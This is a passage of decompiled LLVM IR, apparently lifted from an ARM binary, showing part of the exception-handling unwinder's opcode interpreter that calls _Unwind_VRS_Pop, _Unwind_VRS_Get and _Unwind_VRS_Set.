  store i8 %v2_1ac94, i8* %v2_1ac88, align 1
  %v0_1ac98.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ac98.pr.pr, label %.thread3.dec_label_pc_1ac9c_crit_edge, label %dec_label_pc_1accc

.thread3.dec_label_pc_1ac9c_crit_edge:            ; preds = %.thread3
  %v0_1ac9c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ac9c

dec_label_pc_1ac9c:                               ; preds = %.thread3.dec_label_pc_1ac9c_crit_edge, %dec_label_pc_1ac88
  %v2_1acb0 = phi i32 [ %v0_1ac9c.pre, %.thread3.dec_label_pc_1ac9c_crit_edge ], [ %v0_1ac88, %dec_label_pc_1ac88 ]
  %v1_1ac9c = add i32 %v2_1acb0, 9
  %v2_1ac9c = inttoptr i32 %v1_1ac9c to i8*
  %v3_1ac9c = load i8, i8* %v2_1ac9c, align 1
  %v4_1ac9c = zext i8 %v3_1ac9c to i32
  store i32 %v4_1ac9c, i32* %r3.global-to-local, align 4
  %v2_1aca0 = icmp eq i8 %v3_1ac9c, 0
  store i1 %v2_1aca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aca0, label %dec_label_pc_1acdc, label %dec_label_pc_1acac

dec_label_pc_1acac:                               ; preds = %dec_label_pc_1ac9c
  %v1_1acac = add nsw i32 %v4_1ac9c, -1
  store i32 %v1_1acac, i32* %r3.global-to-local, align 4
  %v1_1acb0 = trunc i32 %v1_1acac to i8
  store i8 %v1_1acb0, i8* %v2_1ac9c, align 1
  %v0_1acb4 = load i32, i32* @r5, align 4
  %v1_1acb4 = add i32 %v0_1acb4, 4
  %v2_1acb4 = inttoptr i32 %v1_1acb4 to i32*
  %v3_1acb4 = load i32, i32* %v2_1acb4, align 4
  store i32 %v3_1acb4, i32* %r2.global-to-local, align 4
  %v1_1acb8 = inttoptr i32 %v3_1acb4 to i32*
  %v2_1acb8 = load i32, i32* %v1_1acb8, align 4
  store i32 %v2_1acb8, i32* %r0.global-to-local, align 4
  %v4_1acb8 = add i32 %v3_1acb4, 4
  store i32 %v4_1acb8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1acb8, i32* %v2_1acb4, align 4
  %v0_1acc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1acc4 = trunc i32 %v0_1acc4 to i8
  %v2_1acc4 = load i32, i32* @r5, align 4
  %v3_1acc4 = add i32 %v2_1acc4, 8
  %v4_1acc4 = inttoptr i32 %v3_1acc4 to i8*
  store i8 %v1_1acc4, i8* %v4_1acc4, align 1
  %v0_1acc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1acc8 = load i32, i32* @r5, align 4
  %v2_1acc8 = inttoptr i32 %v1_1acc8 to i32*
  store i32 %v0_1acc8, i32* %v2_1acc8, align 4
  br label %dec_label_pc_1accc

dec_label_pc_1accc:                               ; preds = %.thread3, %dec_label_pc_1acac
  %v0_1accc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1accc, i32* %r3.global-to-local, align 4
  %v3_1acd0 = mul i32 %v0_1accc, 256
  store i32 %v3_1acd0, i32* %r0.global-to-local, align 4
  %v1_1acd4 = load i32, i32* @r5, align 4
  %v2_1acd4 = inttoptr i32 %v1_1acd4 to i32*
  store i32 %v3_1acd0, i32* %v2_1acd4, align 4
  %v0_1acd8 = load i32, i32* %r3.global-to-local, align 4
  %v3_1acd8 = udiv i32 %v0_1acd8, 16777216
  br label %dec_label_pc_1acdc

dec_label_pc_1acdc:                               ; preds = %dec_label_pc_1ac9c, %dec_label_pc_1accc
  %storemerge133 = phi i32 [ %v3_1acd8, %dec_label_pc_1accc ], [ 176, %dec_label_pc_1ac9c ]
  %v1_1acdc = load i32, i32* %ip.global-to-local, align 4
  %v4_1acdc = mul i32 %v1_1acdc, 256
  %v5_1acdc = or i32 %v4_1acdc, %storemerge133
  store i32 %v5_1acdc, i32* %r2.global-to-local, align 4
  %v7_1ace0 = icmp eq i32 %v5_1acdc, 32768
  store i1 %v7_1ace0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ace0, label %dec_label_pc_1aeec, label %dec_label_pc_1ace8

dec_label_pc_1ace8:                               ; preds = %dec_label_pc_1acdc
  %v3_1ace8 = mul i32 %v5_1acdc, 16
  store i32 %v3_1ace8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1acf8 = and i32 %v3_1ace8, 65520
  store i32 %v3_1acf8, i32* %r2.global-to-local, align 4
  %v0_1acfc = load i32, i32* @r7, align 4
  store i32 %v0_1acfc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1ad04 = call i32 @_Unwind_VRS_Pop(i32 %v0_1acfc, i32 %v3_1acf8, i32 0, i32 0)
  store i32 %v4_1ad04, i32* %r0.global-to-local, align 4
  %v2_1ad08 = icmp eq i32 %v4_1ad04, 0
  store i1 %v2_1ad08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad08, label %dec_label_pc_1ad10, label %dec_label_pc_1aeec

dec_label_pc_1ad10:                               ; preds = %dec_label_pc_1ace8
  %v0_1ad10 = load i32, i32* @r5, align 4
  %v1_1ad10 = add i32 %v0_1ad10, 8
  %v2_1ad10 = inttoptr i32 %v1_1ad10 to i8*
  %v3_1ad10 = load i8, i8* %v2_1ad10, align 1
  %v4_1ad10 = zext i8 %v3_1ad10 to i32
  store i32 %v4_1ad10, i32* %r3.global-to-local, align 4
  %v0_1ad14 = load i32, i32* @r4, align 4
  %v1_1ad14 = and i32 %v0_1ad14, 32768
  %v2_1ad14 = icmp eq i32 %v1_1ad14, 0
  store i1 %v2_1ad14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad14, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_1ad10
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1ad10, %bb147
  %v2_1ad1c = icmp eq i8 %v3_1ad10, 0
  store i1 %v2_1ad1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad1c, label %dec_label_pc_1ad2c, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_1ad20 = add nsw i32 %v4_1ad10, -1
  store i32 %v2_1ad20, i32* %r3.global-to-local, align 4
  %v2_1ad24 = trunc i32 %v2_1ad20 to i8
  store i8 %v2_1ad24, i8* %v2_1ad10, align 1
  %v0_1ad28.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ad28.pr.pr, label %.thread6.dec_label_pc_1ad2c_crit_edge, label %dec_label_pc_1ac58

.thread6.dec_label_pc_1ad2c_crit_edge:            ; preds = %.thread6
  %v0_1ad2c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ad2c

dec_label_pc_1ad2c:                               ; preds = %bb148, %.thread6.dec_label_pc_1ad2c_crit_edge
  %v0_1ad2c = phi i32 [ %v0_1ad2c.pre, %.thread6.dec_label_pc_1ad2c_crit_edge ], [ %v0_1ad10, %bb148 ]
  %v1_1ad2c = add i32 %v0_1ad2c, 9
  %v2_1ad2c = inttoptr i32 %v1_1ad2c to i8*
  %v3_1ad2c = load i8, i8* %v2_1ad2c, align 1
  %v4_1ad2c = zext i8 %v3_1ad2c to i32
  store i32 %v4_1ad2c, i32* %r3.global-to-local, align 4
  %v2_1ad30 = icmp eq i8 %v3_1ad2c, 0
  store i1 %v2_1ad30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad30, label %dec_label_pc_1ad38, label %dec_label_pc_1ac3c

dec_label_pc_1ad38:                               ; preds = %dec_label_pc_1ad2c, %dec_label_pc_1ac30, %dec_label_pc_1ac58
  %v0_1ad38 = load i32, i32* @sl, align 4
  %v2_1ad38 = icmp eq i32 %v0_1ad38, 0
  store i1 %v2_1ad38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad38, label %dec_label_pc_1ae00, label %bb149

bb149:                                            ; preds = %dec_label_pc_1ad38
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad44

dec_label_pc_1ad44:                               ; preds = %bb149, %dec_label_pc_1b2b4, %dec_label_pc_1b154, %dec_label_pc_1af78, %dec_label_pc_1af30, %dec_label_pc_1aeec, %dec_label_pc_1ae00
  %v1_1ad4c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_1b2b4 ], [ 9, %dec_label_pc_1b154 ], [ 9, %dec_label_pc_1af78 ], [ 9, %dec_label_pc_1af30 ], [ 9, %dec_label_pc_1aeec ], [ %v0_1ae34, %dec_label_pc_1ae00 ]
  store i32 %v9_1ac08, i32* %r6.global-to-local, align 4
  store i32 %v21_1ac08, i32* @lr, align 4
  ret i32 %v1_1ad4c

dec_label_pc_1ad50:                               ; preds = %dec_label_pc_1ac74
  %v1_1ad50 = mul i32 %v0_1ac74, 4
  %v3_1ad54 = and i32 %v1_1ad50, 252
  store i32 %v3_1ad54, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1ad60 = load i32, i32* @r7, align 4
  store i32 %v0_1ad60, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_1ad68 = add nuw nsw i32 %v3_1ad54, 4
  store i32 %v1_1ad68, i32* %r6.global-to-local, align 4
  %v5_1ad70 = call i32 @_Unwind_VRS_Get(i32 %v0_1ad60, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1ad74 = load i32, i32* @r4, align 4
  %v1_1ad74 = and i32 %v0_1ad74, 64
  %v2_1ad74 = icmp eq i32 %v1_1ad74, 0
  store i1 %v2_1ad74, i1* %cpsr_z.global-to-local, align 1
  %v4_1ad7c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1ad88 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_1ad88
  %storemerge160.p = select i1 %v2_1ad74, i32 %v2_1ad88, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1ad7c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_1ada4 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1ada4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ac1c.backedge

dec_label_pc_1ac1c.backedge:                      ; preds = %dec_label_pc_1ad50, %dec_label_pc_1adcc, %dec_label_pc_1b250, %dec_label_pc_1af1c, %dec_label_pc_1af54, %dec_label_pc_1aed4, %dec_label_pc_1b140
  %v0_1ac1c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ac1c

dec_label_pc_1adac:                               ; preds = %dec_label_pc_1ac7c
  %v7_1adac = icmp eq i32 %v1_1ac7c, 144
  store i1 %v7_1adac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1adac, label %dec_label_pc_1adb4, label %dec_label_pc_1aef4

dec_label_pc_1adb4:                               ; preds = %dec_label_pc_1adac
  %v1_1adb4 = urem i32 %v0_1ac74, 16
  store i32 %v1_1adb4, i32* %r2.global-to-local, align 4
  %v2_1adb8 = icmp eq i32 %v1_1adb4, 15
  store i1 %v2_1adb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1adb8, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_1adb4
  %v8_1adbc = icmp eq i32 %v1_1adb4, 13
  store i1 %v8_1adbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1adbc, label %bb154, label %dec_label_pc_1adcc

.thread21:                                        ; preds = %dec_label_pc_1adb4
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1aeec

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1aeec

dec_label_pc_1adcc:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1add8 = load i32, i32* @r7, align 4
  store i32 %v0_1add8, i32* %r0.global-to-local, align 4
  %v5_1ade0 = call i32 @_Unwind_VRS_Get(i32 %v0_1add8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1ade8 = load i32, i32* @r7, align 4
  store i32 %v0_1ade8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_1adf8 = call i32 @_Unwind_VRS_Set(i32 %v0_1ade8, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1adf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ac1c.backedge

dec_label_pc_1ae00:                               ; preds = %dec_label_pc_1ad38
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1ae10 = load i32, i32* @r7, align 4
  store i32 %v0_1ae10, i32* %r0.global-to-local, align 4
  %v7_1ae18 = call i32 @_Unwind_VRS_Get(i32 %v0_1ae10, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1ae1c = load i32, i32* @r7, align 4
  store i32 %v0_1ae1c, i32* %r0.global-to-local, align 4
  %v0_1ae20 = load i32, i32* @sl, align 4
  store i32 %v0_1ae20, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_1ae20, i32* %r3.global-to-local, align 4
  %v5_1ae30 = call i32 @_Unwind_VRS_Set(i32 %v0_1ae1c, i32 %v0_1ae20, i32 15, i32 %v0_1ae20, i8* bitcast (i32* @0 to i8*))
  %v0_1ae34 = load i32, i32* @sl, align 4
  store i32 %v0_1ae34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad44

dec_label_pc_1ae3c:                               ; preds = %dec_label_pc_1b030
  %v7_1ae3c = icmp eq i32 %v0_1b030, 199
  store i1 %v7_1ae3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ae3c, label %dec_label_pc_1b110, label %dec_label_pc_1ae44

dec_label_pc_1ae44:                               ; preds = %dec_label_pc_1ae3c
  %v1_1ae44 = and i32 %v0_1ac74, 248
  store i32 %v1_1ae44, i32* %r3.global-to-local, align 4
  %v7_1ae48 = icmp eq i32 %v1_1ae44, 192
  store i1 %v7_1ae48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ae48, label %.thread24, label %dec_label_pc_1ae60

.thread24:                                        ; preds = %dec_label_pc_1ae44
  %v2_1ae4c = urem i32 %v0_1ac74, 16
  %v2_1ae50 = add nuw nsw i32 %v2_1ae4c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1ae58 = or i32 %v2_1ae50, 655360
  store i32 %v2_1ae58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1af1c

dec_label_pc_1ae60:                               ; preds = %dec_label_pc_1ae44
  %v7_1ae60 = icmp eq i32 %v0_1b030, 200
  store i1 %v7_1ae60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ae60, label %dec_label_pc_1b0a4, label %dec_label_pc_1ae68

dec_label_pc_1ae68:                               ; preds = %dec_label_pc_1ae60
  %v7_1ae68 = icmp eq i32 %v0_1b030, 201
  store i1 %v7_1ae68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ae68, label %dec_label_pc_1ae70, label %dec_label_pc_1aeec

dec_label_pc_1ae70:                               ; preds = %dec_label_pc_1ae68
  %v0_1ae70 = load i32, i32* @r5, align 4
  %v1_1ae70 = add i32 %v0_1ae70, 8
  %v2_1ae70 = inttoptr i32 %v1_1ae70 to i8*
  %v3_1ae70 = load i8, i8* %v2_1ae70, align 1
  %v4_1ae70 = zext i8 %v3_1ae70 to i32
  store i32 %v4_1ae70, i32* %r3.global-to-local, align 4
  %v2_1ae74 = icmp eq i8 %v3_1ae70, 0
  store i1 %v2_1ae74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ae74, label %dec_label_pc_1ae84, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_1ae70
  %v2_1ae78 = add nsw i32 %v4_1ae70, -1
  store i32 %v2_1ae78, i32* %r3.global-to-local, align 4
  %v2_1ae7c = trunc i32 %v2_1ae78 to i8
  store i8 %v2_1ae7c, i8* %v2_1ae70, align 1
  %v0_1ae80.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ae80.pr.pr, label %.thread26.dec_label_pc_1ae84_crit_edge, label %dec_label_pc_1aeb8

.thread26.dec_label_pc_1ae84_crit_edge:           ; preds = %.thread26
  %v0_1ae84.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ae84

dec_label_pc_1ae84:                               ; preds = %.thread26.dec_label_pc_1ae84_crit_edge, %dec_label_pc_1ae70
  %v2_1ae9c = phi i32 [ %v0_1ae84.pre, %.thread26.dec_label_pc_1ae84_crit_edge ], [ %v0_1ae70, %dec_label_pc_1ae70 ]
  %v1_1ae84 = add i32 %v2_1ae9c, 9
  %v2_1ae84 = inttoptr i32 %v1_1ae84 to i8*
  %v3_1ae84 = load i8, i8* %v2_1ae84, align 1
  %v4_1ae84 = zext i8 %v3_1ae84 to i32
  store i32 %v4_1ae84, i32* %r3.global-to-local, align 4
  %v2_1ae88 = icmp eq i8 %v3_1ae84, 0
  store i1 %v2_1ae88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ae88, label %dec_label_pc_1aed4, label %dec_label_pc_1ae98

dec_label_pc_1ae98:                               ; preds = %dec_label_pc_1ae84
  %v1_1ae98 = add nsw i32 %v4_1ae84, -1
  store i32 %v1_1ae98, i32* %r3.global-to-local, align 4
  %v1_1ae9c = trunc i32 %v1_1ae98 to i8
  store i8 %v1_1ae9c, i8* %v2_1ae84, align 1
  %v0_1aea0 = load i32, i32* @r5, align 4
  %v1_1aea0 = add i32 %v0_1aea0, 4
  %v2_1aea0 = inttoptr i32 %v1_1aea0 to i32*
  %v3_1aea0 = load i32, i32* %v2_1aea0, align 4
  store i32 %v3_1aea0, i32* %r2.global-to-local, align 4
  %v1_1aea4 = inttoptr i32 %v3_1aea0 to i32*
  %v2_1aea4 = load i32, i32* %v1_1aea4, align 4
  store i32 %v2_1aea4, i32* %r0.global-to-local, align 4
  %v4_1aea4 = add i32 %v3_1aea0, 4
  store i32 %v4_1aea4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1aea4, i32* %v2_1aea0, align 4
  %v0_1aeb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1aeb0 = trunc i32 %v0_1aeb0 to i8
  %v2_1aeb0 = load i32, i32* @r5, align 4
  %v3_1aeb0 = add i32 %v2_1aeb0, 8
  %v4_1aeb0 = inttoptr i32 %v3_1aeb0 to i8*
  store i8 %v1_1aeb0, i8* %v4_1aeb0, align 1
  %v0_1aeb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1aeb4 = load i32, i32* @r5, align 4
  %v2_1aeb4 = inttoptr i32 %v1_1aeb4 to i32*
  store i32 %v0_1aeb4, i32* %v2_1aeb4, align 4
  br label %dec_label_pc_1aeb8

dec_label_pc_1aeb8:                               ; preds = %.thread26, %dec_label_pc_1ae98
  %v0_1aeb8 = load i32, i32* %r0.global-to-local, align 4
  %v3_1aeb8 = udiv i32 %v0_1aeb8, 16777216
  %v1_1aebc = urem i32 %v3_1aeb8, 16
  %v3_1aec0 = mul i32 %v0_1aeb8, 256
  %v1_1aec4 = add nuw nsw i32 %v1_1aebc, 1
  store i32 %v1_1aec4, i32* %r1.global-to-local, align 4
  %v1_1aec8 = and i32 %v3_1aeb8, 240
  store i32 %v1_1aec8, i32* %r3.global-to-local, align 4
  %v1_1aecc = load i32, i32* @r5, align 4
  %v2_1aecc = inttoptr i32 %v1_1aecc to i32*
  store i32 %v3_1aec0, i32* %v2_1aecc, align 4
  %v0_1aed0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aed0 = load i32, i32* %r3.global-to-local, align 4
  %v4_1aed0 = mul i32 %v1_1aed0, 4096
  %v5_1aed0 = or i32 %v4_1aed0, %v0_1aed0
  br label %dec_label_pc_1aed4

dec_label_pc_1aed4:                               ; preds = %dec_label_pc_1ae84, %dec_label_pc_1aeb8
  %storemerge = phi i32 [ %v5_1aed0, %dec_label_pc_1aeb8 ], [ 720897, %dec_label_pc_1ae84 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_1aed4 = load i32, i32* @r7, align 4
  store i32 %v0_1aed4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1aee0 = call i32 @_Unwind_VRS_Pop(i32 %v0_1aed4, i32 1, i32 5, i32 5)
  store i32 %v4_1aee0, i32* %r0.global-to-local, align 4
  %v2_1aee4 = icmp eq i32 %v4_1aee0, 0
  store i1 %v2_1aee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aee4, label %dec_label_pc_1ac1c.backedge, label %dec_label_pc_1aeec

dec_label_pc_1aeec:                               ; preds = %dec_label_pc_1b138, %dec_label_pc_1ae68, %dec_label_pc_1af48, %dec_label_pc_1b2ec, %dec_label_pc_1b2bc, %dec_label_pc_1b298, %dec_label_pc_1b124, %dec_label_pc_1aed4, %dec_label_pc_1ace8, %dec_label_pc_1acdc, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad44

dec_label_pc_1aef4:                               ; preds = %dec_label_pc_1adac
  %v7_1aef4 = icmp eq i32 %v1_1ac7c, 160
  store i1 %v7_1aef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aef4, label %dec_label_pc_1aefc, label %dec_label_pc_1af38

dec_label_pc_1aefc:                               ; preds = %dec_label_pc_1aef4
  %v0_1aefc = load i32, i32* %ip.global-to-local, align 4
  %v1_1aefc = urem i32 %v0_1aefc, 8
  %v1_1af00 = xor i32 %v1_1aefc, 7
  store i32 %v1_1af00, i32* %r3.global-to-local, align 4
  %v6_1af08 = lshr i32 4080, %v1_1af00
  %v1_1af0c = and i32 %v0_1ac74, 8
  %v2_1af0c = icmp eq i32 %v1_1af0c, 0
  store i1 %v2_1af0c, i1* %cpsr_z.global-to-local, align 1
  %v1_1af10 = and i32 %v6_1af08, 4080
  %tmp155 = mul nuw nsw i32 %v1_1af0c, 2048
  %tmp156 = or i32 %v1_1af10, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1af1c

dec_label_pc_1af1c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1b2ac.dec_label_pc_1af1c_crit_edge, %bb157, %dec_label_pc_1b108, %dec_label_pc_1b09c, %dec_label_pc_1affc, %dec_label_pc_1aefc
  %v2_1af24 = phi i32 [ %v2_1b020, %.thread44 ], [ %v2_1b028, %bb157 ], [ %v2_1af24.pre, %dec_label_pc_1b2ac.dec_label_pc_1af1c_crit_edge ], [ %v2_1ae58, %.thread24 ], [ %storemerge130, %dec_label_pc_1b108 ], [ %storemerge131, %dec_label_pc_1b09c ], [ %storemerge132, %dec_label_pc_1affc ], [ %tmp156, %dec_label_pc_1aefc ]
  %v0_1af20 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1b2ac.dec_label_pc_1af1c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_1b108 ], [ 3, %dec_label_pc_1b09c ], [ 1, %dec_label_pc_1affc ], [ 0, %dec_label_pc_1aefc ]
  %v0_1af1c = load i32, i32* @r7, align 4
  store i32 %v0_1af1c, i32* %r0.global-to-local, align 4
  store i32 %v0_1af20, i32* %r3.global-to-local, align 4
  %v4_1af24 = call i32 @_Unwind_VRS_Pop(i32 %v0_1af1c, i32 %v0_1af20, i32 %v2_1af24, i32 %v0_1af20)
  store i32 %v4_1af24, i32* %r0.global-to-local, align 4
  %v2_1af28 = icmp eq i32 %v4_1af24, 0
  store i1 %v2_1af28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af28, label %dec_label_pc_1ac1c.backedge, label %dec_label_pc_1af30

dec_label_pc_1af30:                               ; preds = %dec_label_pc_1af1c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad44

dec_label_pc_1af38:                               ; preds = %dec_label_pc_1aef4
  %v7_1af38 = icmp eq i32 %v1_1ac7c, 176
  store i1 %v7_1af38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af38, label %dec_label_pc_1af80, label %dec_label_pc_1af40

dec_label_pc_1af40:                               ; preds = %dec_label_pc_1af38
  %v7_1af40 = icmp eq i32 %v1_1ac7c, 192
  store i1 %v7_1af40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af40, label %dec_label_pc_1b030, label %dec_label_pc_1af48

dec_label_pc_1af48:                               ; preds = %dec_label_pc_1af40
  %v1_1af48 = and i32 %v0_1ac74, 248
  store i32 %v1_1af48, i32* %r3.global-to-local, align 4
  %v7_1af4c = icmp eq i32 %v1_1af48, 208
  store i1 %v7_1af4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af4c, label %dec_label_pc_1af54, label %dec_label_pc_1aeec

dec_label_pc_1af54:                               ; preds = %dec_label_pc_1af48
  %v1_1af54 = urem i32 %v0_1ac74, 8
  %v1_1af58 = add nuw nsw i32 %v1_1af54, 1
  %v1_1af5c = or i32 %v1_1af58, 524288
  store i32 %v1_1af5c, i32* %r2.global-to-local, align 4
  %v0_1af60 = load i32, i32* @r7, align 4
  store i32 %v0_1af60, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1af6c = call i32 @_Unwind_VRS_Pop(i32 %v0_1af60, i32 1, i32 %v1_1af5c, i32 5)
  store i32 %v4_1af6c, i32* %r0.global-to-local, align 4
  %v2_1af70 = icmp eq i32 %v4_1af6c, 0
  store i1 %v2_1af70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af70, label %dec_label_pc_1ac1c.backedge, label %dec_label_pc_1af78

dec_label_pc_1af78:                               ; preds = %dec_label_pc_1af54
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad44

dec_label_pc_1af80:                               ; preds = %dec_label_pc_1af38
  %v0_1af80 = load i32, i32* %ip.global-to-local, align 4
  %v7_1af80 = icmp eq i32 %v0_1af80, 177
  store i1 %v7_1af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af80, label %dec_label_pc_1b284, label %dec_label_pc_1af88

dec_label_pc_1af88:                               ; preds = %dec_label_pc_1af80
  %v7_1af88 = icmp eq i32 %v0_1af80, 178
  store i1 %v7_1af88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af88, label %dec_label_pc_1b15c, label %dec_label_pc_1af90

dec_label_pc_1af90:                               ; preds = %dec_label_pc_1af88
  %v7_1af90 = icmp eq i32 %v0_1af80, 179
  store i1 %v7_1af90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af90, label %dec_label_pc_1af98, label %dec_label_pc_1b004

dec_label_pc_1af98:                               ; preds = %dec_label_pc_1af90
  %v0_1af98 = load i32, i32* @r5, align 4
  %v1_1af98 = add i32 %v0_1af98, 8
  %v2_1af98 = inttoptr i32 %v1_1af98 to i8*
  %v3_1af98 = load i8, i8* %v2_1af98, align 1
  %v4_1af98 = zext i8 %v3_1af98 to i32
  store i32 %v4_1af98, i32* %r3.global-to-local, align 4
  %v2_1af9c = icmp eq i8 %v3_1af98, 0
  store i1 %v2_1af9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af9c, label %dec_label_pc_1afac, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_1af98
  %v2_1afa0 = add nsw i32 %v4_1af98, -1
  store i32 %v2_1afa0, i32* %r3.global-to-local, align 4
  %v2_1afa4 = trunc i32 %v2_1afa0 to i8
  store i8 %v2_1afa4, i8* %v2_1af98, align 1
  %v0_1afa8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1afa8.pr.pr, label %.thread30.dec_label_pc_1afac_crit_edge, label %dec_label_pc_1afe0

.thread30.dec_label_pc_1afac_crit_edge:           ; preds = %.thread30
  %v0_1afac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1afac

dec_label_pc_1afac:                               ; preds = %.thread30.dec_label_pc_1afac_crit_edge, %dec_label_pc_1af98
  %v2_1afc4 = phi i32 [ %v0_1afac.pre, %.thread30.dec_label_pc_1afac_crit_edge ], [ %v0_1af98, %dec_label_pc_1af98 ]
  %v1_1afac = add i32 %v2_1afc4, 9
  %v2_1afac = inttoptr i32 %v1_1afac to i8*
  %v3_1afac = load i8, i8* %v2_1afac, align 1
  %v4_1afac = zext i8 %v3_1afac to i32
  store i32 %v4_1afac, i32* %r3.global-to-local, align 4
  %v2_1afb0 = icmp eq i8 %v3_1afac, 0
  store i1 %v2_1afb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1afb0, label %dec_label_pc_1affc, label %dec_label_pc_1afc0

dec_label_pc_1afc0:                               ; preds = %dec_label_pc_1afac
